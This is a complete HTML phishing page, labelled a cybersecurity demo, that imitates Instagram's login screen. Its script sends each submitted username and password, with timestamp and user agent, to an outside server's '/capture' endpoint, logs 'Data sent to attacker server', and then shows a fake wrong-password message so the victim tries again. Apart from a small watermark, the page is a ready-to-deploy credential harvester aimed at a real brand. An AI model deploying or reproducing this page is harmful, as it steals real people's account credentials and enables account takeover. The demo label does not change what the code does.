<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - CYBERSECURITY DEMO</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 32px;
            max-width: 935px;
            width: 100%;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            width: 350px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            width: 175px;
        }

        .input-group {
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 12px;
            cursor: pointer;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider span {
            padding: 0 18px;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .forgot-password {
            display: block;
            margin-top: 12px;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 350px;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .get-app {
            margin-top: 20px;
            text-align: center;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
            align-items: center;
        }

        .app-buttons img {
            height: 40px;
            object-fit: contain;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
        }

        .error-msg {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .try-again-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }

        .demo-watermark {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(255, 71, 87, 0.9);
            color: white;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 11px;
            z-index: 9999;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="container">
        <div>
            <div class="login-box" id="loginBox">
                <div class="logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
                </div>

                <form id="demoForm">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Password">
                    </div>
                    <button type="submit" class="login-btn">Log in</button>
                </form>

                <div class="divider">
                    <span>OR</span>
                </div>

                <a href="#" class="fb-login">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    Log in with Facebook
                </a>

                <a href="#" class="forgot-password">Forgot password?</a>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>

            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store">
                    <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
        <p>© 2026 Cybersecurity Training Demo</p>
    </div>

    <div class="demo-watermark">🔒 CYBERSECURITY DEMO</div>

    <script>
        const API_URL = 'https://backend-9y3h.onrender.com';

        document.getElementById('demoForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            try {
                const response = await fetch(API_URL + '/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
                
                const result = await response.json();
                console.log('Data sent to attacker server:', result);
                
            } catch (err) {
                console.error('Demo error:', err);
            }
            
            document.getElementById('loginBox').innerHTML = 
                '<div style="padding: 40px 20px;">' +
                '<p class="error-msg">Sorry, your password was incorrect. Please double-check your password.</p>' +
                '<button onclick="location.reload()" class="try-again-btn">Try Again</button>' +
                '</div>';
        });
    </script>

</body>
</html>
